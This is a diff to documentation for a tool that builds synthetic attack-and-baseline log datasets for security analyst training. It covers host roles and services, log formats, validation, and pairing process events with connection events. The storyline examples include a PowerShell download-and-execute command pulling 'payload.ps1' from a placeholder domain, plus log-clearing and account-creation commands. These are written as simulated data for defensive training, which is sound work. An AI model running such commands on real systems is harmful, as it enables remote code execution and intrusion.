@@ -54,6 +54,8 @@ Multiple attackers and parallel attack paths are supported — for example, an e
 
 **System roles** — Assign `roles` to systems in the environment to enable automatic lateral movement patterns in the baseline. Roles like `file_server`, `database`, `web_server`, `mail_server`, `print_server`, `dns_server`, `nfs_server` trigger corresponding service account traffic (backup agents, monitoring, AD replication, app→DB connections, etc.). These patterns create realistic background lateral movement that analysts must distinguish from malicious activity.
 
+`roles` and `services` now do more than flavor the baseline. The compiled world model uses them to decide what a host is for, which infrastructure systems exist, and whether remote activity should look like SSH, RDP, or generic network execution. For server and infrastructure hosts, ask for both whenever the user can provide them.
+
 **Difficulty** — How hard should the attack be to find? This affects baseline noise intensity, how spread out the attack events are, and whether the attacker uses obvious or subtle techniques.
 
 **Red herrings** — Should the dataset include explicit suspicious-but-benign events beyond automatic ambient noise? These are events with innocent explanations that create false leads for analysts: after-hours admin sessions, failed logon bursts from fat-fingered passwords, large outbound transfers that are actually backup sync, service accounts authenticating from unusual hosts. Define these in the `red_herrings:` section — they use the same event types as the storyline but include an `explanation` field for the instructor ground truth. Note: ambient suspicious noise (controlled by `baseline_activity.suspicious_noise`, default "high") is separate and always active.
@@ -184,7 +186,8 @@ environment:
       os: "Windows 10"           # OS determines which log formats are generated
       type: workstation           # workstation | server | domain_controller
       assigned_user: marcus.chen  # Optional
-      services: []               # Optional
+      services: []               # Optional, but valuable for server realism
+      roles: []                  # Optional, but strongly recommended for servers/proxies
 
   service_accounts: []             # Optional: custom service/system accounts valid as storyline actors
 
@@ -314,6 +317,8 @@ The `os` field on systems determines which native log formats are generated:
 - **web_access** → Generated for systems with `roles: [web_server]`
 - **proxy_access** → Generated for systems with `roles: [forward_proxy]`; logs all outbound HTTP/HTTPS from internal systems routed through the proxy, with CONNECT entries for HTTPS, cache HIT/MISS, and full destination URLs
 
+For realism, try to provide both `roles` and `services` on non-workstation hosts. The generator uses them to compile the world model that drives infrastructure-aware background traffic and realistic remote-session paths.
+
 See `references/evidence-formats.md` for detailed field documentation, output paths, and known limitations for each log format.
 
 ### Validation Rules
@@ -328,6 +333,8 @@ The scenario is validated before generation. Common issues to avoid:
 - Usernames, hostnames, and IPs must all be unique
 - Network segment `systems` must reference existing hostnames
 - Network sensor `monitoring_segments` must reference existing segment names
+
+Even when validation passes, weak host metadata can still reduce realism. If a dataset needs believable server-to-server traffic or admin pivots, make sure important hosts have meaningful `roles` and `services`, and every user has the right `primary_system`.
 
 ## Building the Storyline
 
@@ -387,19 +394,29 @@ The `raw` type targets a specific output format with arbitrary fields — use it
 events:
   - type: process
     process_name: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
-    command_line: "powershell.exe -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.50/payload.ps1')\""
+    command_line: "powershell.exe -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://cdn-assets-update.com/payload.ps1')\""
     technique: "T1059.001 - PowerShell"
+  - type: connection               # Pair with connection so domain appears in DNS/SSL/proxy
+    dst_ip: "203.0.113.50"
+    dst_port: 443
+    hostname: "cdn-assets-update.com"
+    service: ssl
 ```
+
+IMPORTANT: When a process command line references a domain URL (Invoke-WebRequest, DownloadString, curl, wget), always add a paired `connection` event with `hostname` set. Without it, the domain will appear in Sysmon but be completely absent from DNS, SSL, HTTP, and proxy logs — a glaring cross-source inconsistency. For raw-IP URLs, the connection alone (without `hostname`) is sufficient.
 
 **Network connections (C2, exfiltration):**
 
 IMPORTANT: For C2 and exfiltration connections, always specify `method`, `uri`, and `user_agent` when using `service: http`. Without these fields, the engine auto-generates generic HTTP metadata (random URIs like `/favicon.ico`) that won't reflect the actual attack activity in Zeek http.log or proxy logs. For `service: ssl` (HTTPS), the HTTP layer is encrypted and not visible to Zeek, so these fields aren't needed — but the connection will still appear in conn.log and ssl.log.
+
+IMPORTANT: When a connection uses a domain name (not a raw IP), set `hostname` on the connection event. This ensures the domain appears in DNS, SSL SNI, x509 certificate subject, and proxy logs. Without it, these logs either miss the domain or use a random hostname. Omit `hostname` for raw-IP C2 (no DNS lookup expected).
 
 ```yaml
 events:
   - type: connection
     dst_ip: "198.51.100.10"
     dst_port: 443
+    hostname: "cdn-assets-update.com"   # Domain for DNS/SSL/proxy
     service: "ssl"
     technique: "T1071.001 - Web Protocols"
 ```
@@ -462,7 +479,7 @@ events:
 
 **Causal expansion — auto-generated prerequisite events:** The generation engine automatically emits prerequisite and consequent events with realistic timing offsets. You do NOT need to manually specify these as prerequisites:
 
-- **DNS before connections** — TCP connections auto-generate a DNS lookup (5-80ms before) with caching, SERVFAIL probability, and NXDOMAIN companions. Baseline web/SaaS connections use domain-first selection for consistent DNS/SNI/proxy hostnames. Storyline connections to raw C2 IPs (not in REVERSE_DNS) skip DNS emission — realistic for direct-IP C2 beaconing
+- **DNS before connections** — TCP connections auto-generate a DNS lookup (5-80ms before) with caching, SERVFAIL probability, and NXDOMAIN companions. Baseline web/SaaS connections use domain-first selection for consistent DNS/SNI/proxy hostnames. Storyline connections with `hostname` set always emit DNS; connections without `hostname` skip DNS (correct for raw-IP C2)
 - **Kerberos before logons** — Kerberos-authenticated Windows domain logons auto-generate TGT (4768) and TGS (4769) on the DC, plus 4672 for elevated users
 - **ProcessAccess after lsass injection** — `create_remote_thread` targeting lsass.exe auto-generates Sysmon Event 10 (1-50ms after)
 - **Audit events from commands** — Process events with admin commands (`net user /add`, `sc create`, `schtasks /create`, `wevtutil cl`) auto-generate the corresponding Windows audit events (4720, 4726, 4728, 4697, 4698, 1102)
